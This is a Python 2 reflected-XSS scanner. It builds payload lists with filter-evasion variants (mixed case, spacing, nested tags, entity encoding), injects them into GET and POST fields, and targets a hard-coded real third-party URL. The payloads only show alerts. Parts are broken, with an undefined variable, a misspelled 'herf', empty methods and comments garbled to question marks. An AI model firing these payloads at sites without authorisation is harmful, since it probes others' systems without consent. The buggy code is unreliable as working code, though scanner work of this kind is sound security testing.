# -*- coding: iso-8859-1 -*-
__author__ = 'BT'

import urllib2
from urllib import urlencode
from re import compile

test_url = "http://www.zhjzg.com/ship.asp?id=4"

class DO_Reflect_Attack(object):

    attack_vector = []
    length_attack_vector_lists = 0

    def __init__(self, level):
        self.attack_vector = Attack_Vector_Factory().get_Attack_Vector_lists(level)
        self.length_attack_vector_lists = len(self.attack_vector)

    def do_Reflect_Attack(self, inserturl):
        '''
        main method
        '''

        #@return "find" or "None"
        result = self.do_Reflect_GET_Attack(inserturl)
        if result != None:
            print "Reflect GET XSS leak is exist~!"
            return "find"
        result = self.do_Reflect_POST_Attack(inserturl)
        if result != None:
            print "Reflect POST XSS leak is exist~!"
            return "find"

        print "No Reflect XSS leak~!"
        return None

    def do_Reflect_GET_Attack(self, inserturl):
        '''
        Reflect GET Attack main method
        '''

        # 攻击向量挨个测试
        for vector_i in range(self.length_attack_vector_lists):

            # 构造测试URL
            url = inserturl + self.attack_vector[vector_i]

            # 发送request，获取response
            response = do_HTTP_request(url)

            # 判断是否有response，如果没有，返回None，返回状态码不是200则返回None
            if response == None:
                print "do_Reflect_GET_Attack response None 1"
                continue

            # 若返回码是200，则判断response html，是否存在XSS漏洞
            html = response.read()
            if judge_HTML_If_XSS_Exist(html):
                return "find"

    def do_Reflect_POST_Attack(self, inserturl):
        '''
        Reflect POST Attack main method
        '''

        params = {}

        # 获取post参数名
        response = do_HTTP_request(inserturl)
        if response == None:
            print "do_Reflect_POST_Attack response None 1"
            return None
        html = response.read()
        post_names = re_HTML_GET_POST_Names(html)
        length_post_names = len(post_names)

        # 如果html中不存在的字符串，即不存在输入框，则返回None
        if post_names == None:
            print "POST Input Frame is inexist"
            return None

        # 攻击向量挨个测试
        for vector_i in range(self.length_attack_vector_lists):

            # 构造post参数名-值对
            for i in range(length_post_names):
                params[post_names[i]] = attack_vector[vector_i]

            # 获取response html
            response = do_HTTP_request(inserturl, params)
            if response == None:
                print "do_Reflect_POST_Attack response None 2"
                continue
            html = response.read()

            # 判断response html，是否存在XSS漏洞
            if judge_HTML_If_XSS_Exist( html):
                return "find"


class Attack_Vector_Factory(object):
    '''
    Product Attack Vector
    '''

    lists = []
    basic_lists = []    # level_2

    def __init__(self):
        self.lists = []
        self.basic_lists = []

    def get_Attack_Vector_lists(self, level):
        '''
        @return Attack Vector lists
        '''

        if level == 1:
            print "Low-intensity Test is running..."
            self.buid_Lists_1_CommonTag()
            return self.lists
        elif level == 2:
            print "Medium-intensity Test is running..."
            self.buid_Lists_1_CommonTag()
            self.buid_Lists_2_PseudoURL()
            self.buid_Lists_3_HTMLEvent()
            self.buid_Lists_4_CSS()
            return self.lists
        elif level == 3:
            print "High-intensity Test is running..."
            self.buid_Lists_1_CommonTag()
            self.buid_Lists_2_PseudoURL()
            self.buid_Lists_3_HTMLEvent()
            self.buid_Lists_4_CSS()

            self.basic_lists = list(self.lists)

            self.rebuild_Lists_1_AaBb()
            self.rebuild_Lists_2_Space()
            self.rebuild_Lists_3_Nest()
            self.rebuild_Lists_4_ASCII()
            self.rebuild_Lists_5_Nature()
            self.rebuild_Lists_6_Notes()
            self.rebuild_Lists_7_HTMLEncode()
            return self.lists
        else:
            print "Input error~!"

    def buid_Lists_1_CommonTag(self):
        '''
        @ ????????
        ??????<script>??????JavaScript??
        '''

        build_lists = ["<script>alert('Spartans')</script>"]
        self.lists += build_lists

    def buid_Lists_2_PseudoURL(self):
        '''
        @ ????????
        ??????JavaScript?URL?????
        '''

        build_lists = ["<img src=\"javascript:alert('Spartans')\"/>",
                       "<a herf=\"javascript:alert('Spartans'))\">click here</a>",
                       "<iframe src=\"javascript:alert('Spartans')\"></iframe>"]
        self.lists += build_lists

    def buid_Lists_3_HTMLEvent(self):
        '''
        @ ????????
        ??????HTML????
        '''

        build_lists = ["<body onload=\"alert('Spartans')\"></body>",
                       "<img src=\"#\" onerror=\"alert('Spartans')\"/>"]
        self.lists += build_lists

    def buid_Lists_4_CSS(self):
        '''
        @ ????????
        ?????????????
        '''

        build_lists = ["<div style=\"background-image: url(javascript:alert('Spartans'))\">",
                       "<style type=\"test/javascript\">alert('Spartans');</style>"]
        self.lists += build_lists

    def rebuild_Lists_1_AaBb(self):
        '''
        @ ?????????
        ?????????
        '''

        tmp_lists = list(self.basic_lists)
        rebuild_lists = []
        beforeStr = "script"
        laterStr = "scRiPt"

        if len(tmp_lists) == 0:
            return None

        # ????beforeStr???????laterStr
        for i in range(len(tmp_lists)):
            if beforeStr in tmp_lists[i]:
                tmp_lists[i] = tmp_lists[i].replace(beforeStr, laterStr)
                rebuild_lists.append(tmp_lists[i])

        self.lists += rebuild_lists

    def rebuild_Lists_2_Space(self):
        '''
        @ ?????????
        ????????????????????
        '''

        tmp_lists = list(self.basic_lists)
        rebuild_lists = []
        beforeStr1 = "<script"
        beforeStr2 = "script>"
        laterStr1 = "< script"
        laterStr2 = "script >"

        if len(tmp_lists) == 0:
            return None

        # ????beforeStr???????laterStr
        for i in range(len(tmp_lists)):
            tmpStr = tmp_lists[i].replace(beforeStr1, laterStr1)
            tmpStr = tmpStr.replace(beforeStr2, laterStr2)

            if tmpStr != tmp_lists[i]:
                tmp_lists[i] = tmpStr
                rebuild_lists.append(tmp_lists[i])

        self.lists += rebuild_lists

    def rebuild_Lists_3_Nest(self):
        '''
        @ ?????????
        ????????????????
        '''

        tmp_lists = list(self.basic_lists)
        rebuild_lists = []
        beforeStr = "script"
        laterStr = "scr<script>ipt"

        if len(tmp_lists) == 0:
            return None

        # ????beforeStr???????laterStr
        for i in range(len(tmp_lists)):
            tmpStr = tmp_lists[i].replace(beforeStr, laterStr)

            if tmpStr != tmp_lists[i]:
                tmp_lists[i] = tmpStr
                rebuild_lists.append(tmp_lists[i])

        self.lists += rebuild_lists

    def rebuild_Lists_4_ASCII(self):
        '''
        @ ?????????
        ???????????ASCII?
        '''

        tmp_lists = list(self.basic_lists)
        rebuild_lists = []
        beforeStr1 = "java"
        beforeStr2 = "script"
        laterStr1 = "ja&#13;va"
        laterStr2 = "sc&#10;ript"

        if len(tmp_lists) == 0:
            return None

        # ????beforeStr???????laterStr
        for i in range(len(tmp_lists)):
            tmpStr = tmp_lists[i].replace(beforeStr1, laterStr1)
            tmpStr = tmpStr.replace(beforeStr2, laterStr2)

            if tmpStr != tmp_lists[i]:
                tmp_lists[i] = tmpStr
                rebuild_lists.append(tmp_lists[i])

        self.lists += rebuild_lists

    def rebuild_Lists_5_Nature(self):
        '''
        @ ?????????
        ??????????javascript??????????????????????>????????????????
        '''

    def rebuild_Lists_6_Notes(self):
        '''
        @ ?????????
        ?????????????????
        '''

    def rebuild_Lists_7_HTMLEncode(self):
        '''
        @ ?????????
        ???????????HTML?????????????
        '''


def do_HTTP_request (url, params={}, httpheaders={}):
    '''
    Send a GET or POST HTTP Request.
    @return: HTTP Response
    '''

    data = {}
    request = None

    # If there is parameters, they are been encoded
    if params:
        data = urlencode(params)

        request = urllib2.Request ( url, data, headers=httpheaders )
    else:
        request = urllib2.Request ( url, headers=httpheaders )

    # Send the request, if except occured, the code isn't 200 OK
    try:
        response = urllib2.urlopen (request)
    except:
        print 'Response CODE isn\'t 200 OK'
        return None

    return response

def re_HTML_GET_POST_Names ( html):
    '''
    RE response html
    find input NAME
    @return: name's list[] or None
    '''

    # Match specific token
    match = compile ( r'<input name="[^"]*"')

    # Judge if the specific token exist
    length = len ( match.findall(html))
    if length == 0:
        return None

    # Trim the names lists
    names = match.findall(html)
    for i in range(length):
        names[i] = names[i].split('"')[1]

    return names

def judge_HTML_If_XSS_Exist( html):
    '''
    Judge if the html exist xss
    '''

    return attack_vector in html

def main() :
    DO_Reflect_Attack(1).do_Reflect_Attack( test_url )

if __name__ == "__main__" :
    main()